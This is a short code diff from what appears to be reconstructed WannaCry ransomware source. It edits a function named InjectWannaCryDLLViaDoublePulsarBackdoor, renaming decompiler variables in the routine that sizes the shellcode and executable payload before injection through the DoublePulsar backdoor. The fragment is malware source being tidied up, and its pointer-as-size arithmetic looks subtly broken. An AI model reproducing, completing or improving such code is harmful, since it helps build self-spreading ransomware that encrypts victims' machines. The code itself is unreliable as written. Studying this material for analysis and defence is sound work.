@@ -59,7 +59,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, uns
 	qmemcpy((char *)hMem + SizeOfShellcode, payload_exe_buffer, (unsigned int)payload);
 	 if ( (signed int)&payload[sizeOfshellcode] % 4 )
     	{
-      		TotalSizeOfPayload = 4 * ((signed int)&v5[v4] / 4) + 4;
+      		TotalSizeOfPayload = 4 * ((signed int)&payload[sizeOfshellcode] / 4) + 4;
 	 }
 	else {
 		TotalSizeOfPayload = (int)&payload[sizeOfshellcode];
